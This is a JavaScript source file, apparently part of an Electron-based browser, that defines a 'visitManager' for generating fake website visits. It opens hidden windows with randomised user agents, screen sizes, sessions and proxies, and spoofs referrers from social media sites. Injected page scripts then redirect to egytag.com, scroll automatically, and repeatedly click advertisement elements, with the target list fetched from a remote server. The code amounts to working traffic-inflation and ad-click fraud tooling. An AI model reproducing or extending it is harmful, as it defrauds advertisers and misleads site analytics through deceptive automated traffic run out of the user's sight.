(function (w) {
    if (w.MYSERVERVISITSCRIPT_LOADED) {
        console.log('MYSERVERVISITSCRIPT Aborting 0 ...');
        return;
    }

    w.MYSERVERVISITSCRIPT_LOADED = true;
    w.MYSERVERVISITSCRIPT = true;

    SOCIALBROWSER.visitManager = {
        currentIndex: 0,
        visitOptions: { show: false, timeout: 1000 * 60 * 5, url: 'https://egytag.com/', host: 'egytag.com', referer: 'dynamic', proxy: null, partition: null, scroll: true },

        visitList: [
            { referer: 'dynamic', url: 'https://egytag.com/', timeout: 1000 * 60 * 10 },
            { referer: 'dynamic', url: 'https://egytag.com/torrents', timeout: 1000 * 60 * 10 },
        ],
        refererList: [
            'https://flipboard.com/',
            'https://vk.com/',
            'https://getpocket.com/',
            'https://digg.com/video',
            'https://www.pinterest.com/',
            'https://www.linkedin.com/',
            'https://www.reddit.com/',
            'https://twitter.com/',
            'https://www.tiktok.com/',
            'https://qzone.qq.com/',
            'https://www.tumblr.com/',
            'https://www.instagram.com/',
            'https://web.wechat.com/?lang=en',
            'https://web.whatsapp.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/c/NextCorporation/about',
        ],
        userAgentList: [],
        scrrenSizeList: ['1366x768', '1280x768', '1280x768', '1280x768', '1024x768', '1280x720', '1366x768', '1280x768', '800x600'],
        randomScreenSize: function () {
            return SOCIALBROWSER.visitManager.scrrenSizeList[Math.floor(Math.random() * SOCIALBROWSER.visitManager.scrrenSizeList.length)];
        },
        randomUserAgent: function () {
            return SOCIALBROWSER.var.user_agent_list[Math.floor(Math.random() * SOCIALBROWSER.var.user_agent_list.length)];
        },
        randomReferer: function () {
            return SOCIALBROWSER.visitManager.refererList[Math.floor(Math.random() * SOCIALBROWSER.visitManager.refererList.length)];
        },
        randomPartition: function () {
            return SOCIALBROWSER.var.session_list[Math.floor(Math.random() * SOCIALBROWSER.var.session_list.length)].name;
        },
        randomVisit: function () {
            if (SOCIALBROWSER.visitManager.visitList.length > 0) {
                return SOCIALBROWSER.visitManager.visitList[Math.floor(Math.random() * SOCIALBROWSER.visitManager.visitList.length)];
            } else {
                return SOCIALBROWSER.visitManager.visitOptions;
            }
        },
        prepareVisits: function () {
            SOCIALBROWSER.fetchJson(
                {
                    url: SOCIALBROWSER.server_url + '/api/visit_list',
                    method: 'GET',
                },
                function (data) {
                    if (data.done && data.list && data.list.length > 0) {
                        SOCIALBROWSER.visitManager.visitList = [];
                        data.list.forEach((v) => {
                            SOCIALBROWSER.visitManager.visitList.push(v);
                        });
                    }
                },
            );
        },
    };

    SOCIALBROWSER.visitManager.createFakeVisitWindow = function (op) {
        let options = { ...SOCIALBROWSER.visitManager.visitOptions, ...op };
        let preload = SOCIALBROWSER.dir + '/browser_files/js/context-menu.js';

        let scrren_size = SOCIALBROWSER.visitManager.randomScreenSize().split('x');

        let win = new SOCIALBROWSER.remote.BrowserWindow({
            show: options.show,
            width: parseInt(scrren_size[0] || '1366'),
            height: parseInt(scrren_size[1] || '768'),
            skipTaskbar: true,
            webPreferences: {
                sandbox: false,
                contextIsolation: false,
                enableRemoteModule: true,
                nodeIntegrationInSubFrames: true,
                partition: options.partition || SOCIALBROWSER.visitManager.randomPartition(),
                webaudio: false,
                preload: preload,
            },
        });

        win.webContents.audioMuted = true;

        if (options.userAgent) {
            win.webContents.userAgent = options.userAgent;
        } else {
            win.webContents.userAgent = SOCIALBROWSER.visitManager.randomUserAgent().url;
        }

        if (SOCIALBROWSER.var.core.id.like('*test*')) {
            win.setSkipTaskbar(false);
            win.showInactive();
            win.openDevTools();
        } else {
            if (options.show) {
                win.maximize();
            } else {
                win.hide();
            }
        }

        win.setMenuBarVisibility(false);
        if (options.proxy) {
            const ss = win.webContents.session;
            ss.setProxy(
                {
                    proxyRules: options.proxy,
                    proxyBypassRules: '127.0.0.1',
                },
                function () {},
            );
        }
        if (options.referer == 'dynamic') {
            options.referer = SOCIALBROWSER.visitManager.randomReferer();
        }

        let code0 = `if (!window.SOCIALBROWSER) {
    window.SOCIALBROWSER = {
        var: {
            core: { id: '' },
            blocking: {
                core: {},
                youtube: {},
            },
        },
        isIframe: () => {
            try {
                return window.self !== window.top;
            } catch (e) {
                return true;
            }
        },
    };
}

window.open = function (url) {
    if (!url || url == 'about:blank') {
        return;
    }
    console.log(' [ window.open ] ' + url);
    setTimeout(function () {
        document.location.href = url;
    }, 5 * 1000);
};

localStorage.clear = () => {
    console.log('User Request Clear LocalStorage');
};
`;
        let code1 = `function __document__ready__1() {
    if (SOCIALBROWSER.isIframe()) {
        return;
    }

    console.log(' [ CODE 1 ] ');

    if (document.querySelector('body')) {
        setTimeout(function () {
            let a = document.createElement('a');
            a.href = '${options.url}';
            a.id = '__a_injected';
            a.innerHTML = '${options.url}';
            a.setAttribute('target', '_self');
            document.querySelector('body').appendChild(a);
            a.style.backgroundColor = 'red';
            a.style.color = '#ffffff';
            a.style.fontSize = '22px';
            a.scrollIntoView();
            a.click();
        }, 5 * 1000);
    }

    setTimeout(function () {
        console.log(' [ Force Redirect .... ] ');
        document.location.href = '${options.url}';
    }, 20 * 1000);
}
`;
        let code2 = `function __document__ready__2() {
    if (SOCIALBROWSER.isIframe()) {
        return;
    }

    console.log(' [ CODE 2 ] ');

    if ('${options.scroll}' == 'true') {
        setInterval(() => {
            let body1 = document.querySelector('body');
            if (body1) {
                body1.click();
            }

            let y = window.scrollY;
            y = y + 10;
            if (window.innerHeight + window.scrollY >= document.body.offsetHeight) {
                y = 0;
                document.documentElement.scrollTop = 0;
            }
            window.scrollTo(0, y);
        }, 100);
    }

    setInterval(() => {
        let ad1 = document.querySelector('html>div img');
        if (ad1) {
            ad1.click();
        }
        let ad2 = document.querySelector('#next-id');
        if (ad2) {
            ad2.click();
        }
    }, 1000 * 10);
}
`;
        let codex = `let fnn = null;
if (
    document.location.hostname.indexOf('pinterest') > -1 ||
    document.location.hostname.indexOf('flipboard.com') > -1 ||
    document.location.hostname.indexOf('google') > -1 ||
    document.location.hostname.indexOf('linkedin') > -1 ||
    document.location.hostname.indexOf('instagram') > -1 ||
    document.location.hostname.indexOf('reddit') > -1 ||
    document.location.hostname.indexOf('twitter') > -1 ||
    document.location.hostname.indexOf('tiktok') > -1 ||
    document.location.hostname.indexOf('qq.com') > -1 ||
    document.location.hostname.indexOf('tumblr.com') > -1 ||
    document.location.hostname.indexOf('wechat') > -1 ||
    document.location.hostname.indexOf('whatsapp') > -1 ||
    document.location.hostname.indexOf('facebook') > -1 ||
    document.location.hostname.indexOf('digg') > -1 ||
    document.location.hostname.indexOf('getpocket') > -1 ||
    document.location.hostname.indexOf('vk.com') > -1 ||
    document.location.hostname.indexOf('youtube') > -1
) {
    fnn = __document__ready__1;
} else {
    fnn = __document__ready__2;
}

if (document.readyState !== 'loading') {
    fnn();
} else {
    document.addEventListener('DOMContentLoaded', () => {
        fnn();
    });
}
`;

        if (op.url.like('*egytag.com*')) {
            code2 = `function __document__ready__2() {
    if (document.location.hostname.like('*egytag.com')) {
        console.log(' [ Real Visit To Egytag.com ] ');
        console.log('URL        : ' + document.location.href);
        console.log('Referrer   : ' + document.referrer);
        console.log('User Agent : ' + navigator.userAgent);

        function isViewable(element) {
            const rect = element.getBoundingClientRect();
            return (
                rect.top >= 0 &&
                rect.left >= 0 &&
                rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) &&
                rect.right <= (window.innerWidth || document.documentElement.clientWidth)
            );
        }

        function findGoodPost() {
            let ok = false;
            let arr = document.querySelectorAll('.post-url');
            arr.forEach((a) => {
                if (!ok && isViewable(a)) {
                    ok = true;
                    a.setAttribute('target', '_self');
                    SOCIALBROWSER.redirectLink = a.getAttribute('href');
                    a.click();
                }
            });
            if (!ok) {
                setTimeout(() => {
                    findGoodPost();
                }, 1000 * (Math.floor(Math.random() * 30) + 60));
            }
        }

        if (document.location.pathname.like('*post*')) {
            setTimeout(() => {
                document.querySelector('.brand a').click();
            }, 1000 * (Math.floor(Math.random() * 15) + 60));
        } else {
            setTimeout(() => {
                findGoodPost();
            }, 1000 * (Math.floor(Math.random() * 30) + 60));
        }

        let ss = setInterval(() => {
            let ins = document.querySelector('html > ins');
            if (ins && ins.style.display != 'none') {
                clearInterval(ss);
                document.documentElement.scrollTop = 0;

                if (SOCIALBROWSER.redirectLink) {
                    let form = document.createElement('form');
                    form.action = SOCIALBROWSER.redirectLink;
                    form.method = 'get';
                    form.name = 'redirect';
                    document.body.appendChild(form);
                }
                setTimeout(() => {
                    if (SOCIALBROWSER.redirectLink) {
                        document.forms['redirect'].submit();
                    } else {
                        document.location.reload();
                    }
                }, 1000 * 5);
            } else {
                if ('${options.scroll}' == 'true') {
                    let y = window.scrollY;
                    y = y + Math.floor(Math.random() * 100);
                    if (window.innerHeight + window.scrollY >= document.body.offsetHeight) {
                        y = 0;
                        document.documentElement.scrollTop = 0;
                    }
                    window.scrollTo(0, y);
                }
            }
        }, 2000);

        setInterval(() => {
            let ad1 = document.querySelector('html>div img');
            if (ad1) {
                ad1.click();
            }
            let ad2 = document.querySelector('#next-id');
            if (ad2) {
                ad2.click();
            }
        }, 1000 * 10);
    }
}
`;
        }

        let code_injected = code0 + code1 + code2 + codex;
        if (SOCIALBROWSER.var.core.version < '2021.03.01') {
            win.webContents.addListener('dom-ready', function (event) {
                win.webContents.executeJavaScript(code_injected);
            });
        } else {
            SOCIALBROWSER.call('[set][window][setting]', {
                win_id: win.id,
                name: 'eval',
                code: code_injected,
            });
        }

        win.loadURL(options.referer).catch((err) => {
            if (err.code === 'ERR_ABORTED') {
            }
        });

        win.on('close', function () {
            win.destroy();
        });

        win.on('closed', function () {
            SOCIALBROWSER.visitManager.runFakeVisit();
        });

        win.webContents.on('did-fail-load', function (e) {
            if (e.isMainFrame) {
                win.destroy();
            }
        });

        win.webContents.session.on('will-download', (event, item, webContents) => {
            event.preventDefault();
        });

        setTimeout(function () {
            if (win && !win.isDestroyed()) {
                win.destroy();
            }
        }, options.timeout);
    };

    SOCIALBROWSER.visitManager.runFakeVisit = function () {
        setTimeout(() => {
            SOCIALBROWSER.visitManager.createFakeVisitWindow(SOCIALBROWSER.visitManager.randomVisit());
        }, 1000 * 10); /** for cpu relax */
    };

    SOCIALBROWSER.visitManager.prepareVisits();
    SOCIALBROWSER.visitManager.runFakeVisit();

    setInterval(() => {
        SOCIALBROWSER.visitManager.prepareVisits();
    }, 1000 * 60 * 30);
})(window);
